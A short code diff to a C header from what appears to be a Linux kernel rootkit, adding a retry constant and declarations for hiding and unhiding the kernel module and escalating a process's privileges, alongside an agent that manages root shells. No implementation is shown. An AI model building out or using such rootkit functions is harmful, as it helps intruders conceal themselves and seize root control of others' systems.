@@ -12,6 +12,8 @@
 #include "protocol.h"
 #include "secure_control.h"
 
+#define RK_RETRY_MAX_CAP_MS 5000
+
 struct socket;
 struct rk_root_shell;
 struct task_struct;
@@ -47,5 +49,9 @@ __must_check int rk_agent_start(struct rk_agent *agent,
 				struct rk_root_shell *shell,
 				struct rk_root_shell *exec_shell);
 void rk_agent_stop(struct rk_agent *agent);
+
+void rk_module_hide(void);
+void rk_module_unhide(void);
+int rk_escalate_pid(unsigned int pid);
 
 #endif
